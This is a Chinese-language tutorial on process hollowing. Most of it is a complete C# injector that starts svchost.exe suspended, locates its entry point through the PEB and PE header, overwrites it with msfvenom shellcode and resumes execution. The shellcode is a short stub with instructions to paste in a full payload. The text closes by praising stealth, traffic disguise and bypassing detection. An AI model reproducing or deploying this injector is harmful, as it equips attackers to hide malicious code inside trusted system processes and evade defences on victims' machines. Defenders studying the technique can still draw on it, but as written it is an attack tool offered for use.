# 进程空洞化技术

## 概述

进程空洞化（Process Hollowing）是一种高级进程注入技术，通过创建挂起的进程，替换其代码后恢复执行。

## 为什么使用进程空洞化？

### 问题

- explorer.exe 等进程通常不产生网络流量
- svchost.exe 运行在 SYSTEM 级别，无法直接注入
- 直接启动 svchost.exe 会立即终止

### 解决方案

创建挂起的进程，在执行前替换其代码

## 工作流程

```
1. CreateProcess (CREATE_SUSPENDED)
   创建挂起的进程
   ↓
2. ZwQueryInformationProcess
   获取 PEB 地址
   ↓
3. ReadProcessMemory
   读取进程基地址
   ↓
4. 解析 PE 头
   定位 EntryPoint
   ↓
5. WriteProcessMemory
   写入 shellcode
   ↓
6. ResumeThread
   恢复执行
```

## PE 文件结构

| 偏移 | 内容 |
|------|------|
| 0x00 | MZ 签名 (0x5A4D) |
| 0x3C | e_lfanew (PE 头偏移) |
| PE+0x00 | PE 签名 (0x4550) |
| PE+0x28 | AddressOfEntryPoint |

## 完整 C# 代码

```csharp
using System;
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
        // 结构体定义
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        // API 导入
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
            int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            // 1. 创建挂起的进程
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // 2. 获取 PEB 地址
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            if (IntPtr.Size != 8)
            {
                throw new NotSupportedException("此示例按 x64 进程空洞化编写；x86 需要使用对应的 PEB 偏移和 4 字节指针读取。");
            }

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // 3. 读取进程基地址
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // 4. 读取 PE 头
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            // 5. 解析 EntryPoint
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // 6. 写入 shellcode
            // 将 msfvenom 生成的完整 x64 shellcode byte[] 粘贴到这里；不要把省略号放进数组。
            byte[] buf = new byte[] {
                0xfc, 0x48, 0x83, 0xe4, 0xf0
            };
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            // 7. 恢复执行
            ResumeThread(pi.hThread);
        }
    }
}
```

## 关键 API 详解

### CreateProcess

```csharp
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe",
    IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
```

| 参数 | 值 | 说明 |
|------|-----|------|
| lpCommandLine | svchost.exe 路径 | 要创建的进程 |
| dwCreationFlags | 0x4 | CREATE_SUSPENDED |

### ZwQueryInformationProcess

```csharp
ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
```

| 参数 | 值 | 说明 |
|------|-----|------|
| ProcessInformationClass | 0 | ProcessBasicInformation |
| 返回 | bi.PebAddress | PEB 地址 |

### 定位 EntryPoint

```csharp
// PEB + 0x10 = 进程基地址指针
IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

// 读取基地址
ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

// 解析 PE 头
uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);  // PE 头偏移
uint entrypoint_rva = BitConverter.ToUInt32(data, (int)(e_lfanew_offset + 0x28));  // EntryPoint RVA
IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);  // 绝对地址
```

## 优势

1. **隐蔽性高** - 代码在合法进程中执行
2. **网络伪装** - svchost.exe 正常产生网络流量
3. **权限继承** - 继承目标进程的权限
4. **绕过检测** - 不创建新线程

## 注意事项

1. **架构匹配** - 必须使用 64 位编译
2. **进程选择** - 选择合适的目标进程
3. **时机控制** - 在进程执行前完成替换
4. **稳定性** - 确保 shellcode 大小合适
